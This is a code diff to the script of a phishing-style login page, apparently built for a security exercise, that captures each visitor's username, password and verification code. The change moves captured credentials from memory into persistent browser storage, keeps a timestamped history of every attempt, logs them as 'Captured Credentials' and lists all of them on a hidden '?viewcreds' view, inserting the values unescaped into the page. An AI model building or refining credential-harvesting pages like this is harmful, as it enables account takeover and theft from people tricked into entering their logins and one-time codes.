@@ -132,50 +132,70 @@
     </div>
 
     <script>
-        let credentials = {};
-
-        // Check for viewcreds query parameter on page load
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            if (urlParams.has('viewcreds')) {
-                // Hide login and code sections, show credentials
-                document.getElementById('loginSection').style.display = 'none';
-                document.getElementById('codeSection').style.display = 'none';
-                document.getElementById('viewCreds').style.display = 'block';
-                
-                // Display credentials if they exist
-                if (Object.keys(credentials).length > 0) {
-                    document.getElementById('credsContent').innerHTML = `
-                        <h2>Stored Credentials</h2>
-                        <p><strong>Username:</strong> ${credentials.username || 'N/A'}</p>
-                        <p><strong>Password:</strong> ${credentials.password || 'N/A'}</p>
-                        <p><strong>Code:</strong> ${credentials.code || 'N/A'}</p>
-                    `;
-                } else {
-                    document.getElementById('credsContent').innerHTML = '<p>No credentials available.</p>';
-                }
-            }
-        };
-
         function submitLogin() {
-            credentials.username = document.getElementById('username').value;
-            credentials.password = document.getElementById('password').value;
+            const newCredentials = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                timestamp: new Date().toISOString()
+            };
+
+            // Retrieve existing credentials from localStorage or initialize empty array
+            let credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+            credentialHistory.push(newCredentials);
+            localStorage.setItem('credentialHistory', JSON.stringify(credentialHistory));
+
             document.getElementById('loginSection').style.display = 'none';
             document.getElementById('codeSection').style.display = 'block';
         }
 
         function submitCode() {
-            credentials.code = document.getElementById('code').value;
+            const credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+            const latestCredentials = credentialHistory[credentialHistory.length - 1] || {};
+            latestCredentials.code = document.getElementById('code').value;
+            latestCredentials.codeTimestamp = new Date().toISOString();
+
+            // Update the latest entry with the code
+            credentialHistory[credentialHistory.length - 1] = latestCredentials;
+            localStorage.setItem('credentialHistory', JSON.stringify(credentialHistory));
+
             document.getElementById('codeSection').style.display = 'none';
             document.getElementById('viewCreds').style.display = 'block';
             document.getElementById('credsContent').innerHTML = '<p>Verification complete. Thank you.</p>';
 
-            // Store credentials (simulated, in-memory only within ZCSC)
-            console.log('Captured Credentials:', credentials);
-
-            // Simulate viewcreds endpoint
+            console.log('Captured Credentials:', latestCredentials);
             window.history.pushState({}, '', '/?viewcreds');
         }
+
+        // Check for viewcreds query parameter on page load
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.has('viewcreds')) {
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('codeSection').style.display = 'none';
+                document.getElementById('viewCreds').style.display = 'block';
+
+                // Retrieve all credentials from localStorage
+                const credentialHistory = JSON.parse(localStorage.getItem('credentialHistory')) || [];
+                
+                if (credentialHistory.length > 0) {
+                    let credsHtml = '<h2>Stored Credentials</h2>';
+                    credentialHistory.forEach((creds, index) => {
+                        credsHtml += `
+                            <div style="margin-bottom: 20px;">
+                                <h3>Attempt ${index + 1} (${creds.timestamp})</h3>
+                                <p><strong>Username:</strong> ${creds.username || 'N/A'}</p>
+                                <p><strong>Password:</strong> ${creds.password || 'N/A'}</p>
+                                <p><strong>Code:</strong> ${creds.code || 'Not submitted'}</p>
+                                ${creds.code ? `<p><strong>Code Submitted At:</strong> ${creds.codeTimestamp}</p>` : ''}
+                            </div>
+                        `;
+                    });
+                    document.getElementById('credsContent').innerHTML = credsHtml;
+                } else {
+                    document.getElementById('credsContent').innerHTML = '<p>No credentials available.</p>';
+                }
+            }
+        };
 
         // Simulate showing password
         document.querySelector('span').addEventListener('click', function() {
